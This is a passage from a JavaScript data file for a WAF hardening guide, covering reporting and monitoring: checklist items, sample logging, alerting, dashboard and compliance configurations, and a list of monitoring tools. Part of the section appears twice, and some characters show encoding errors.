                { id: '9.3.5', text: 'Set up executive-level security metrics', priority: 'low' },
                { id: '9.3.6', text: 'Implement custom security reports and visualizations', priority: 'medium' },
                { id: '9.3.7', text: 'Configure anomaly detection for attack patterns', priority: 'high' },
                { id: '9.3.8', text: 'Set up machine learning-based security analytics', priority: 'medium' },
                { id: '9.3.9', text: 'Implement threat intelligence correlation', priority: 'high' },
                { id: '9.3.10', text: 'Configure geolocation-based attack visualization', priority: 'medium' },
                { id: '9.3.11', text: 'Set up automated report generation and distribution', priority: 'medium' },
                { id: '9.3.12', text: 'Implement security posture scoring and tracking', priority: 'high' },
                { id: '9.3.13', text: 'Configure attack surface visualization', priority: 'medium' },
                { id: '9.3.14', text: 'Set up predictive attack trend analysis', priority: 'medium' }
            ]
        },
        {
            title: '9.4 Incident Response Integration',
            icon: 'fa-fire-extinguisher',
            items: [
                { id: '9.4.1', text: 'Configure integration with SOAR platforms', priority: 'high' },
                { id: '9.4.2', text: 'Set up automated incident creation from alerts', priority: 'high' },
                { id: '9.4.3', text: 'Implement playbook-driven response actions', priority: 'medium' },
                { id: '9.4.4', text: 'Configure evidence collection and preservation', priority: 'high' },
                { id: '9.4.5', text: 'Set up threat hunting based on WAF data', priority: 'medium' },
                { id: '9.4.6', text: 'Implement attack pattern identification', priority: 'high' },
                { id: '9.4.7', text: 'Configure automated blocking of attack sources', priority: 'medium' },
                { id: '9.4.8', text: 'Set up incident classification based on WAF data', priority: 'medium' },
                { id: '9.4.9', text: 'Implement incident lifecycle tracking', priority: 'medium' },
                { id: '9.4.10', text: 'Configure post-incident reporting and metrics', priority: 'high' },
                { id: '9.4.11', text: 'Set up attack simulation and response testing', priority: 'medium' },
                { id: '9.4.12', text: 'Implement forensic data collection procedures', priority: 'high' }
            ]
        },
        {
            title: '9.5 Compliance Reporting',
            icon: 'fa-file-contract',
            items: [
                { id: '9.5.1', text: 'Configure PCI DSS compliance reporting', priority: 'high' },
                { id: '9.5.2', text: 'Set up GDPR violation monitoring', priority: 'high' },
                { id: '9.5.3', text: 'Implement HIPAA security controls reporting', priority: 'medium' },
                { id: '9.5.4', text: 'Configure SOC 2 compliance evidence collection', priority: 'medium' },
                { id: '9.5.5', text: 'Set up automated compliance posture assessment', priority: 'high' },
                { id: '9.5.6', text: 'Implement regulatory control mapping', priority: 'medium' },
                { id: '9.5.7', text: 'Configure audit trail for compliance requirements', priority: 'high' },
                { id: '9.5.8', text: 'Set up compliance gap analysis reporting', priority: 'medium' },
                { id: '9.5.9', text: 'Implement data access tracking for regulated data', priority: 'high' },
                { id: '9.5.10', text: 'Configure risk-based compliance reporting', priority: 'medium' },
                { id: '9.5.11', text: 'Set up customized compliance dashboards', priority: 'medium' },
                { id: '9.5.12', text: 'Implement data sovereignty compliance monitoring', priority: 'medium' }
            ]
        },
        {
            title: '9.6 Operational Monitoring',
            icon: 'fa-heartbeat',
            items: [
                { id: '9.6.1', text: 'Configure WAF health monitoring', priority: 'critical' },
                { id: '9.6.2', text: 'Set up resource utilization tracking', priority: 'high' },
                { id: '9.6.3', text: 'Implement performance monitoring and baselines', priority: 'high' },
                { id: '9.6.4', text: 'Configure availability and uptime monitoring', priority: 'critical' },
                { id: '9.6.5', text: 'Set up configuration change tracking', priority: 'high' },
                { id: '9.6.6', text: 'Implement license and capacity monitoring', priority: 'medium' },
                { id: '9.6.7', text: 'Configure backup and recovery monitoring', priority: 'high' },
                { id: '9.6.8', text: 'Set up signature update monitoring', priority: 'medium' },
                { id: '9.6.9', text: 'Implement SLA monitoring and reporting', priority: 'high' },
                { id: '9.6.10', text: 'Configure historical performance trending', priority: 'medium' },
                { id: '9.6.11', text: 'Set up traffic pattern anomaly detection', priority: 'high' },
                { id: '9.6.12', text: 'Implement automation for recovery procedures', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Centralized Logging Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure centralized logging to collect, store, and analyze security events from the WAF.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure centralized logging</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">logging</span></div>
                    <div class="code-comment"># Local logging settings</div>
                    <div><span class="code-param">local-log</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">local-log-level</span> <span class="code-value">info</span></div>
                    <div><span class="code-param">local-retention</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">local-rotation</span> <span class="code-value">size</span> <span class="code-param">max-size</span> <span class="code-value">500</span></div>
                    <div><span class="code-param">local-compression</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Syslog server configuration</div>
                    <div><span class="code-command">remote-syslog</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"primary-siem"</span></div>
                    <div><span class="code-command">remote-syslog</span> <span class="code-value">"primary-siem"</span></div>
                    <div><span class="code-param">address</span> <span class="code-value">10.0.0.50</span></div>
                    <div><span class="code-param">port</span> <span class="code-value">6514</span></div>
                    <div><span class="code-param">protocol</span> <span class="code-value">tcp</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">cef</span></div>
                    <div><span class="code-param">facility</span> <span class="code-value">local5</span></div>
                    <div><span class="code-param">ssl</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ssl-verify</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure backup syslog server</div>
                    <div><span class="code-command">remote-syslog</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"backup-siem"</span></div>
                    <div><span class="code-command">remote-syslog</span> <span class="code-value">"backup-siem"</span></div>
                    <div><span class="code-param">address</span> <span class="code-value">10.0.1.50</span></div>
                    <div><span class="code-param">port</span> <span class="code-value">6514</span></div>
                    <div><span class="code-param">protocol</span> <span class="code-value">tcp</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">cef</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Log Formats and Standards</h5>
                <p class="mb-4 text-gray-700">Common log formats for security event integration:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Format</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Best For</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">CEF (Common Event Format)</td>
                            <td class="p-3 border">ArcSight's format with standardized field structure</td>
                            <td class="p-3 border">Enterprise SIEM integration (ArcSight, Splunk)</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">LEEF (Log Event Extended Format)</td>
                            <td class="p-3 border">IBM QRadar's structured log format</td>
                            <td class="p-3 border">QRadar SIEM environments</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">JSON</td>
                            <td class="p-3 border">Structured format with field-value pairs</td>
                            <td class="p-3 border">Modern analytics platforms (ELK Stack)</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Syslog RFC5424</td>
                            <td class="p-3 border">Standardized syslog format</td>
                            <td class="p-3 border">Unix/Linux environments, general compatibility</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">GELF (Graylog Extended Format)</td>
                            <td class="p-3 border">Optimized for Graylog with compression support</td>
                            <td class="p-3 border">Graylog-based logging systems</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Logging Configuration</h5>
                <p class="mb-4 text-gray-700">Implement advanced logging features for enhanced security analysis:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced logging features</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">logging</span></div>
                    <div class="code-comment"># Configure log enrichment</div>
                    <div><span class="code-command">enrichment</span></div>
                    <div><span class="code-param">geo-ip</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">threat-intelligence</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">user-context</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">application-context</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure log integrity</div>
                    <div><span class="code-command">integrity</span></div>
                    <div><span class="code-param">signing</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">signing-algorithm</span> <span class="code-value">sha256</span></div>
                    <div><span class="code-param">verification</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">tamper-alerting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure high availability logging</div>
                    <div><span class="code-command">high-availability</span></div>
                    <div><span class="code-param">buffer-queue</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">buffer-size</span> <span class="code-value">1024</span></div>
                    <div><span class="code-param">retry-interval</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">max-retries</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">failover</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Security Alerting Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure alerts to notify security teams of important security events and policy violations.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure security alerts</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">alerts</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Email notification configuration</div>
                    <div><span class="code-command">email</span></div>
                    <div><span class="code-param">server</span> <span class="code-value">smtp.example.com</span></div>
                    <div><span class="code-param">port</span> <span class="code-value">587</span></div>
                    <div><span class="code-param">authentication</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">username</span> <span class="code-value">alerting@example.com</span></div>
                    <div><span class="code-param">password</span> <span class="code-value">********</span></div>
                    <div><span class="code-param">from-address</span> <span class="code-value">waf-alerts@example.com</span></div>
                    <div><span class="code-param">tls</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">recipient</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">security-team@example.com</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">recipient</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">soc@example.com</span> <span class="code-param">severity</span> <span class="code-value">critical</span></div>
                    <div class="code-comment"># Webhook integration for alerting</div>
                    <div><span class="code-command">webhook</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">https://hooks.slack.com/services/TXXXXX/BXXXXX/XXXXXXXXXX</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">json</span></div>
                    <div><span class="code-param">severity</span> <span class="code-value">medium,high,critical</span></div>
                    <div class="code-comment"># Alert thresholds</div>
                    <div><span class="code-command">thresholds</span></div>
                    <div><span class="code-param">attack-threshold</span> <span class="code-value">10</span> <span class="code-param">period</span> <span class="code-value">60</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">dos-threshold</span> <span class="code-value">1000</span> <span class="code-param">period</span> <span class="code-value">60</span> <span class="code-param">severity</span> <span class="code-value">critical</span></div>
                    <div><span class="code-param">brute-force-threshold</span> <span class="code-value">5</span> <span class="code-param">period</span> <span class="code-value">300</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Alert Prioritization Framework</h5>
                <p class="mb-4 text-gray-700">Effective alert management requires proper prioritization to avoid alert fatigue:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Severity</th>
                            <th class="p-3 border bg-gray-100">Response Time</th>
                            <th class="p-3 border bg-gray-100">Example Events</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Critical</td>
                            <td class="p-3 border">Immediate (24/7)</td>
                            <td class="p-3 border">Successful data exfiltration, active breach, DDoS attack</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Within 1 hour</td>
                            <td class="p-3 border">SQL injection attempts, admin access violations, multiple attack vectors</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Medium</td>
                            <td class="p-3 border">Within 8 hours</td>
                            <td class="p-3 border">Pattern of suspicious activity, repeated policy violations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Low</td>
                            <td class="p-3 border">Within 24 hours</td>
                            <td class="p-3 border">Single blocked attacks, minor policy violations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Informational</td>
                            <td class="p-3 border">Routine review</td>
                            <td class="p-3 border">Configuration changes, system updates, learning mode events</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Alert Management</h5>
                <p class="mb-4 text-gray-700">Implement sophisticated alert management to reduce noise and increase effectiveness:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced alert management</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">alerts</span></div>
                    <div class="code-comment"># Alert correlation and aggregation</div>
                    <div><span class="code-command">correlation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">time-window</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">similar-events-threshold</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">upgrade-severity</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">rule</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"sql-injection-campaign"</span></div>
                    <div><span class="code-command">rule</span> <span class="code-value">"sql-injection-campaign"</span></div>
                    <div><span class="code-param">match</span> <span class="code-value">attack-type</span> <span class="code-param">value</span> <span class="code-value">"sql-injection"</span></div>
                    <div><span class="code-param">threshold</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">window</span> <span class="code-value">600</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">notify</span> <span class="code-param">severity</span> <span class="code-value">critical</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Alert suppression and deduplication</div>
                    <div><span class="code-command">suppression</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">duplicate-window</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">rate-limiting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">rate-limit-threshold</span> <span class="code-value">10</span> <span class="code-param">period</span> <span class="code-value">60</span></div>
                    <div><span class="code-command">rule</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"scanner-noise"</span></div>
                    <div><span class="code-command">rule</span> <span class="code-value">"scanner-noise"</span></div>
                    <div><span class="code-param">match</span> <span class="code-value">signature-id</span> <span class="code-param">value</span> <span class="code-value">"1234,1235,1236"</span></div>
                    <div><span class="code-param">match</span> <span class="code-value">source-ip</span> <span class="code-param">value</span> <span class="code-value">"10.0.0.0/8"</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">suppress</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Security Dashboard Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure security dashboards to provide actionable insights into WAF activity and threats.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure security dashboard</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">dashboard</span></div>
                    <div><span class="code-param">refresh-interval</span> <span class="code-value">60</span></div>
                    <div class="code-comment"># Configure widgets and visualizations</div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"attack-summary"</span> <span class="code-param">position</span> <span class="code-value">1</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"top-attackers"</span> <span class="code-param">position</span> <span class="code-value">2</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"geo-map"</span> <span class="code-param">position</span> <span class="code-value">3</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"policy-violations"</span> <span class="code-param">position</span> <span class="code-value">4</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"traffic-summary"</span> <span class="code-param">position</span> <span class="code-value">5</span></div>
                    <div class="code-comment"># Custom dashboard for executives</div>
                    <div><span class="code-command">dashboard</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"executive-view"</span></div>
                    <div><span class="code-command">dashboard</span> <span class="code-value">"executive-view"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"High-level security summary for management"</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"security-score"</span> <span class="code-param">position</span> <span class="code-value">1</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"monthly-trends"</span> <span class="code-param">position</span> <span class="code-value">2</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"compliance-status"</span> <span class="code-param">position</span> <span class="code-value">3</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Key Security Metrics</h5>
                <p class="mb-4 text-gray-700">Essential metrics for effective security monitoring:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Attacks Blocked:</strong> Volume of malicious requests prevented from reaching applications</li>
                    <li class="mb-2"><strong>Attack Distribution:</strong> Types of attacks (SQL injection, XSS, etc.) and their relative frequency</li>
                    <li class="mb-2"><strong>Top Attack Sources:</strong> IPs, countries, and ASNs generating the most attacks</li>
                    <li class="mb-2"><strong>False Positive Rate:</strong> Percentage of legitimate traffic incorrectly blocked</li>
                    <li class="mb-2"><strong>Security Policy Compliance:</strong> Adherence to configured security policies</li>
                    <li class="mb-2"><strong>Mean Time to Detect (MTTD):</strong> Average time to identify security incidents</li>
                    <li><strong>Mean Time to Respond (MTTR):</strong> Average time to address and mitigate threats</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Analytics Configuration</h5>
                <p class="mb-4 text-gray-700">Configure advanced analytics capabilities for deeper security insights:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced security analytics</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">analytics</span></div>
                    <div class="code-comment"># Machine learning configuration</div>
                    <div><span class="code-command">machine-learning</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">baseline-period</span> <span class="code-value">14</span></div>
                    <div><span class="code-param">analysis-interval</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">confidence-threshold</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">model</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"traffic-anomaly"</span></div>
                    <div><span class="code-command">model</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"attack-prediction"</span></div>
                    <div><span class="code-command">model</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"behavior-analysis"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Custom reports configuration</div>
                    <div><span class="code-command">reports</span></div>
                    <div><span class="code-command">report</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"monthly-security-summary"</span></div>
                    <div><span class="code-command">report</span> <span class="code-value">"monthly-security-summary"</span></div>
                    <div><span class="code-param">schedule</span> <span class="code-value">monthly</span> <span class="code-param">day</span> <span class="code-value">1</span> <span class="code-param">time</span> <span class="code-value">00:00</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">pdf</span></div>
                    <div><span class="code-param">sections</span> <span class="code-value">"executive-summary,attack-statistics,compliance-status,recommendations"</span></div>
                    <div><span class="code-param">distribution</span> <span class="code-value">email</span> <span class="code-param">recipients</span> <span class="code-value">"security-team@example.com,ciso@example.com"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Compliance and Operational Monitoring',
            content: `
                <p class="mb-4 text-gray-700">Configure compliance reporting and operational monitoring for comprehensive oversight.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure compliance reporting</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">compliance</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># PCI DSS compliance</div>
                    <div><span class="code-command">pci-dss</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requirement-6.6</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requirement-6.5</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requirement-10.2</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requirement-10.6</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">evidence-collection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># GDPR compliance</div>
                    <div><span class="code-command">gdpr</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">data-breach-monitoring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sensitive-data-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">data-access-logging</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Operational monitoring</div>
                    <div><span class="code-command">operational</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">health-check-interval</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">cpu-threshold</span> <span class="code-value">80</span></div>
                    <div><span class="code-param">memory-threshold</span> <span class="code-value">80</span></div>
                    <div><span class="code-param">disk-threshold</span> <span class="code-value">85</span></div>
                    <div><span class="code-param">connection-threshold</span> <span class="code-value">90</span></div>
                    <div><span class="code-param">alert-on-threshold</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Integration with SOAR platform</div>
                    <div><span class="code-command">incident-response</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">soar-integration</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">soar-endpoint</span> <span class="code-value">"https://soar.example.com/api/incidents"</span></div>
                    <div><span class="code-param">api-key</span> <span class="code-value">encrypt</span></div>
                    <div><span class="code-param">auto-create-incidents</span> <span class="code-value">enable</span> <span class="code-param">threshold</span> <span class="code-value">"high,critical"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Compliance Mapping</h5>
                <p class="mb-4 text-gray-700">Key WAF controls and their mapping to common compliance frameworks:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">WAF Control</th>
                            <th class="p-3 border bg-gray-100">PCI DSS</th>
                            <th class="p-3 border bg-gray-100">GDPR</th>
                            <th class="p-3 border bg-gray-100">HIPAA</th>
                            <th class="p-3 border bg-gray-100">SOC 2</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Web Application Firewall</td>
                            <td class="p-3 border">Req 6.6</td>
                            <td class="p-3 border">Art. 32</td>
                            <td class="p-3 border">Â§164.312(a)</td>
                            <td class="p-3 border">CC6.1, CC6.8</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Attack Detection & Blocking</td>
                            <td class="p-3 border">Req 6.5</td>
                            <td class="p-3 border">Art. 32</td>
                            <td class="p-3 border">Â§164.308(a)(5)</td>
                            <td class="p-3 border">CC7.1, CC7.2</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Security Logging</td>
                            <td class="p-3 border">Req 10.2, 10.3</td>
                            <td class="p-3 border">Art. 33</td>
                            <td class="p-3 border">Â§164.312(b)</td>
                            <td class="p-3 border">CC4.1, CC7.3</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Alert Management</td>
                            <td class="p-3 border">Req 10.6, 10.8</td>
                            <td class="p-3 border">Art. 33, 34</td>
                            <td class="p-3 border">Â§164.308(a)(6)</td>
                            <td class="p-3 border">CC7.3, CC7.4</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Access Control</td>
                            <td class="p-3 border">Req 7.1, 7.2</td>
                            <td class="p-3 border">Art. 25, 32</td>
                            <td class="p-3 border">Â§164.312(a)(1)</td>
                            <td class="p-3 border">CC6.1, CC6.3</td>
                        </tr>
                    </tbody>
                </table>
            `
        }
    ],
    tools: [
        {
            title: 'SIEM Integration',
            icon: 'fa-database',
            description: 'Security Information and Event Management system for centralized log analysis.',
            link: 'https://www.splunk.com/',
            linkText: 'Splunk'
        },
        {
            title: 'ELK Stack',
            icon: 'fa-layer-group',
            description: 'Elasticsearch, Logstash, and Kibana stack for log management and visualization.',
            link: 'https://www.elastic.co/elastic-stack',
            linkText: 'Elastic Stack'
        },
        {
            title: 'Log Analyzer',
            icon: 'fa-search',
            description: 'Tool for analyzing WAF logs to identify patterns and anomalies.',
            link: 'https://www.graylog.org/',
            linkText: 'Graylog'
        },
        {
            title: 'Alert Management',
            icon: 'fa-bell',
            description: 'Platform for managing security alerts and coordinating response activities.',
            link: 'https://www.pagerduty.com/',
            linkText: 'PagerDuty'
        },
        {
            title: 'Grafana',
            icon: 'fa-chart-area',
            description: 'Advanced visualization platform for creating custom security dashboards and metrics.',
            link: 'https://grafana.com/',
            linkText: 'Grafana'
        },
        {
            title: 'SOAR Platform',
            icon: 'fa-robot',
            description: 'Security Orchestration, Automation and Response platform for incident management.',
            link: 'https://www.paloaltonetworks.com/cortex/cortex-xsoar',
            linkText: 'Cortex XSOAR'
        },
        {
            title: 'Compliance Reporter',
            icon: 'fa-clipboard-check',
            description: 'Tool for generating compliance reports and evidence for regulatory frameworks.',
            link: 'https://www.rapid7.com/products/insightvm/',
            linkText: 'Rapid7 InsightVM'
        },
        {
            title: 'OpenSearch',
            icon: 'fa-search-plus',
            description: 'Open source analytics and visualization suite for security log analysis.',
            link: 'https://opensearch.org/',
            linkText: 'OpenSearch'
        },
        {
            title: 'Fluentd',
            icon: 'fa-stream',
            description: 'Open source data collector for unified logging layer with multiple output options.',
            link: 'https://www.fluentd.org/',
            linkText: 'Fluentd'
        },
        {
            title: 'Prometheus',
            icon: 'fa-fire',
            description: 'Open source monitoring system with dimensional data model and alerting.',
            link: 'https://prometheus.io/',
            linkText: 'Prometheus'
        },
        {
            title: 'TheHive',
            icon: 'fa-bug',
            description: 'Scalable, open source security incident response platform for SOC teams.',
            link: 'https://thehive-project.org/',
            linkText: 'TheHive Project'
        },
        {
            title: 'Sigma Rules',
            icon: 'fa-fingerprint',
            description: 'Open standard for SIEM rules to detect suspicious activities in logs.',
            link: 'https://github.com/SigmaHQ/sigma',
            linkText: 'SigmaHQ'
        }
    ]
},
       {
    id: 'reporting',
    title: '9. Reporting & Monitoring',
    subtitle: 'Logging, alerting, and security event management',
    icon: 'fa-chart-line',
    priority: 'high',
    progress: 17,
    checklist: [
        {
            title: '9.1 Logging Configuration',
            icon: 'fa-clipboard-list',
            items: [
                { id: '9.1.1', text: 'Configure centralized logging', priority: 'critical' },
                { id: '9.1.2', text: 'Set up log rotation and retention policies', priority: 'high' },
                { id: '9.1.3', text: 'Configure log format and fields', priority: 'medium' },
                { id: '9.1.4', text: 'Set up secure log transport (TLS/encryption)', priority: 'high' },
                { id: '9.1.5', text: 'Configure log integrity verification', priority: 'medium' },
                { id: '9.1.6', text: 'Implement log storage encryption', priority: 'medium' },
                { id: '9.1.7', text: 'Configure log backup procedures', priority: 'high' },
                { id: '9.1.8', text: 'Set up log forwarding for redundancy', priority: 'medium' },
                { id: '9.1.9', text: 'Implement log parsing and normalization', priority: 'medium' },
                { id: '9.1.10', text: 'Configure log filtering for noise reduction', priority: 'medium' },
                { id: '9.1.11', text: 'Set up log access controls and audit trail', priority: 'high' },
                { id: '9.1.12', text: 'Implement log enrichment with threat intelligence', priority: 'medium' },
                { id: '9.1.13', text: 'Configure log format standardization (CEF, LEEF, JSON)', priority: 'high' },
                { id: '9.1.14', text: 'Set up high-availability logging infrastructure', priority: 'high' }
            ]
        },
        {
            title: '9.2 Alerting & Monitoring',
            icon: 'fa-bell',
            items: [
                { id: '9.2.1', text: 'Set up real-time security alerts', priority: 'critical' },
                { id: '9.2.2', text: 'Configure alert thresholds and severity levels', priority: 'high' },
                { id: '9.2.3', text: 'Implement alert aggregation and correlation', priority: 'medium' },
                { id: '9.2.4', text: 'Set up performance monitoring alerts', priority: 'medium' },
                { id: '9.2.5', text: 'Configure notification methods (email, SMS, API)', priority: 'high' },
                { id: '9.2.6', text: 'Implement escalation procedures for critical alerts', priority: 'high' },
                { id: '9.2.7', text: 'Set up alert throttling to prevent alert fatigue', priority: 'high' },
                { id: '9.2.8', text: 'Configure contextual alert enrichment', priority: 'medium' },
                { id: '9.2.9', text: 'Implement intelligent alert suppression', priority: 'medium' },
                { id: '9.2.10', text: 'Set up alert routing based on attack types', priority: 'medium' },
                { id: '9.2.11', text: 'Configure alert verification mechanisms', priority: 'high' },
                { id: '9.2.12', text: 'Implement on-call rotation for alert management', priority: 'medium' },
                { id: '9.2.13', text: 'Set up SLA-based alerting thresholds', priority: 'high' },
